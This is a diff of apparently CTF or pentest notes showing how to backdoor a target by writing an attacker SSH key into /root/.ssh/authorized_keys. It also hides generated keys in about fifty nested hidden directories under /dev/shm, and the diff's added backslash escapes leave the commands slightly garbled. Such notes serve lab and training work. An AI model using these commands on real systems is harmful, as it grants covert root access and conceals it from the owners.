@@ -882,15 +882,15 @@ cat /home/kali/.ssh/sshctf.pub | xclip -selection clipboard
 On target:
 
 \`\`\`
-echo "<key>" > /root/.ssh/authorized_keys
+echo \"<key>\" > /root/.ssh/authorized_keys
 \`\`\`
 
 **Generate A Key - ed**
 
 \`\`\`
-export tmp=".o"
+export tmp=\".o\"
 mkdir $tmp
-for i in {1..50}; do export tmp="${tmp}/.o"; mkdir /dev/shm/${tmp}; done
+for i in {1..50}; do export tmp=\"${tmp}/.o\"; mkdir /dev/shm/${tmp}; done
 ssh-keygen -t ed25519 -C root@box.local << EOF
 /dev/shm/${tmp}/rooot
 
@@ -904,9 +904,9 @@ ssh-add /dev/shm/${tmp}/rooot
 **Generate A Key - rsa**
 \`\`\`
 
-export tmp=".o"
+export tmp=\".o\"
 mkdir $tmp
-for i in {1..50}; do export tmp="${tmp}/.o"; mkdir /dev/shm/${tmp}; done
+for i in {1..50}; do export tmp=\"${tmp}/.o\"; mkdir /dev/shm/${tmp}; done
 ssh-keygen -t rsa -C root@box.local << EOF
 /dev/shm/${tmp}/rooot
 
